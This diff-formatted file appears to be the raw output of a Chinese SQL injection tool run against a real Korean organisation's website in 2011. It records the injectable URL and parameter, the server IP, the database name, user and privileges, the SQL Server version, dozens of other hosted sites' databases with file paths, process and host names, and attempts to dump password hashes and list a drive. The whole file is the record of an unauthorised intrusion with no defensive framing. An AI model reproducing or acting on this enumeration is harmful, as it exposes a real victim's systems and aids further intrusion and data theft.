@@ -1,0 +1,134 @@
+■漏洞信息:============================================================
+ ·URL:http://www.kauic.or.kr/Notice/notice2_view.asp?pg=4&find_sel=&find_str=&div=&snum=2056
+ ·页面标题：KAUIC *茄惫措切沥焊拳蛆狼雀*
+ ·参数:pg=4&find_sel=&find_str=&div=&snum=2056
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.47.66.77
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 05:44:46 GMT
+X-Powered-By: ASP.NET
+Content-Length: 13310
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDSQDRSQTQ=GNHGGGPDKJEKHHEHEOHKODMH; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：kauic_or_kr
+- 用户名：kauic_or_kr
+- 版本：Microsoft SQL Server  2000 - 8.00.2055 (Intel X86) 
+	Dec 16 2008 19:46:53 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：SQL11
+- 服务名：MSSQLSERVER
+- 系统用户名：kauic_or_kr
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+100bogam_co_kr	F:\Userdatabase\100bogam_co_kr_Dat.MDF	
+admin_skinaria_com	F:\UserDatabase\admin_skinaria_com_dat.mdf	
+air-sale_co_kr	F:\UserDatabase\air-sale_co_kr_dat.mdf	
+allimi_or_kr	F:\Userdatabase\allimi_or_kr_Dat.MDF	
+angelsday_co_kr	F:\Userdatabase\angelsday_co_kr_Dat.MDF	
+apable_co_kr	F:\Userdatabase\apable_co_kr_Dat.MDF	
+arinmhc_com	F:\UserDatabase\arinmhc_com_dat.mdf	
+arooa_com	F:\Userdatabase\arooa_com_Dat.MDF	
+ashkorea_com	F:\UserDatabase\ashkorea_com_dat.mdf	
+bageul_co_kr	F:\Userdatabase\bageul_co_kr_Dat_Dat.MDF	
+bbarunbag_com	F:\UserDatabase\bbarunbag_com_dat.mdf	
+betterworld_or_kr	F:\Userdatabase\betterworld_or_kr_Dat.MDF	
+beyondon_com	F:\Userdatabase\beyondon_com_Dat.MDF	
+bigantinternational_com	F:\UserDatabase\bigantinternational_com_dat.mdf	
+casscientech_com	F:\Userdatabase\casscientech_com_Dat.MDF	
+castlebridge_co_kr	F:\Userdatabase\castlebridge_co_kr_Dat.MDF	
+catoz_com	F:\Userdatabase\catoz_com_Dat.MDF	
+ceje_co_kr	F:\Userdatabase\ceje_co_kr_dat.mdf	
+childcounsel_co_kr	F:\Userdatabase\childcounsel_co_kr_Dat.MDF	
+chokwangdia_com	F:\Userdatabase\chokwangdia_com_dat.mdf	
+chungtaesan_co_kr	F:\UserDatabase\chungtaesan_co_kr_dat.mdf	
+cj21_co_kr	F:\Userdatabase\cj21_co_kr_Dat.MDF	
+ck1_co_kr	F:\Userdatabase\ck1_co_kr_Dat.MDF	
+comins_co_kr	F:\Userdatabase\comins_co_kr_dat.mdf	
+consteng_co_kr	F:\Userdatabase\consteng_co_kr_dat.mdf	
+crizen_sql_co_kr	F:\UserDatabase\crizen_sql_co_kr_dat.mdf	
+crosspoint_co_kr	f:\userdatabase\crosspoint_co_kr_Dat.MDF	
+cstmaster_com	F:\UserDatabase\cstmaster_com_dat.mdf	
+daearesort_com	F:\Userdatabase\daea_resort_test_Data.MDF	
+daejilawbiz_com	F:\Userdatabase\daejilawbiz_com_Dat.MDF	
+dahanoomall_com	F:\Userdatabase\dahanoomall_com_dat.mdf	
+dbworks_co_kr	F:\Userdatabase\dbworks_co_kr_Dat.mdf	
+dentalbanobagi_com	F:\Userdatabase\dentalbanobagi_com_Dat.MDF	
+dknt_co_kr	F:\UserDatabase\dknt_co_kr_dat.mdf	
+dm8245_com	F:\UserDatabase\dm8245_com_dat.mdf	
+dmprinting_co_kr	F:\Userdatabase\dmprinting_co_kr_Dat.MDF	
+documeeting_com	F:\Userdatabase\documeeting_com_Data.MDF	
+dolmaji_com	F:\Userdatabase\dolmaji_com_Dat_Dat.MDF	
+dominopia_com	F:\Userdatabase\dominopia_com_Dat_Dat.MDF	
+dsitec_com	F:\Userdatabase\dsitec_com_Dat.MDF	
+dysbank_co_kr	F:\Userdatabase\dysbank_co_kr_dat.MDF	
+easyeng_co_kr	F:\UserDatabase\easyeng_co_kr_dat.mdf	
+ecobiz21_co_kr	F:\Userdatabase\ecobiz21_co_kr_Dat.MDF	
+eenansystem_com	F:\Userdatabase\eenansystem_com_Dat.MDF	
+elbizsoft_co_kr	F:\Userdatabase\elbizsoft_co_kr_Dat.MDF	
+e-mrp_com	F:\Userdatabase\e-mrp_com_Dat_Dat.MDF	
+enaegabo_co_kr	F:\UserDatabase\enaegabo_co_kr_dat.mdf	
+enssol_co_kr	F:\Userdatabase\enssol_co_kr_Dat.MDF	
+esself_co_kr	F:\Userdatabase\esself_co_kr_Dat.MDF	
+euisami_kr	F:\Userdatabase\euisami_kr_Dat.MDF	
+eutteum_net	F:\UserDatabase\eutteum_net_dat.mdf	
+ever-on_co_kr	F:\Userdatabase\ever-on_co_kr_Dat_Dat.MDF	
+footkiss_net	F:\Userdatabase\footkiss_net_dat.mdf	
+fswan_net	F:\Userdatabase\fswan_net_Dat.MDF	
+ftp_yycts_co_kr	F:\Userdatabase\ftp_yycts_co_kr_Dat.MDF	
+funfuneng_co_kr	F:\Userdatabase\funfuneng_co_kr_dat.mdf	
+gagubada_net	F:\Userdatabase\gagubada_net_Dat.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	SQL11	2108	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	SQL11	2108	AWAITING COMMAND	SYSTEM	
+PowerBuilder	sleeping	SSUNGWK-PC	4184	AWAITING COMMAND		
+MS SQLEM	sleeping	SQL11	3128	AWAITING COMMAND		
+Microsoft SQL Server Management Studio	sleeping	CREAM-YTH	3608	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+SQL11	SQL Server	SQLOLEDB	SQL11		SQL11	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+一次性获取失败，正在批次获取……
